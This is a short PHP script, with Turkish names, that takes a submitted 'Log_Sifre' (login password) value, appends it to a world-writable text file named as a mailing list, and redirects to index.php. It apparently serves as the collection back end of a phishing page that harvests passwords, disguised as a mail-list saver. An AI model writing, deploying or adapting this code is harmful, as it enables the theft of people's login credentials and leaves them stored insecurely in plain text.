<?php  

header('Content-Type: text/html; charset=utf-8');

$dosya_adi = "maillistesi.txt"; 


$deger = $_POST["Log_Sifre"]; 

$yazilacak_deger = "$deger\n"; 

if ($deger) {  

if (!file_exists($dosya_adi)){  
   
touch($dosya_adi); 
chmod($dosya_adi,0666); 
   
} 

$dosyaya_baglanti = fopen($dosya_adi,"a+"); 

if (!fwrite($dosyaya_baglanti,$yazilacak_deger)){ 
echo "Dosyaya yazılamadı."; 
exit; 

}  

header("Location: index.php");

} else { 

echo "Dosyaya yazılamadı."; 

} 

?>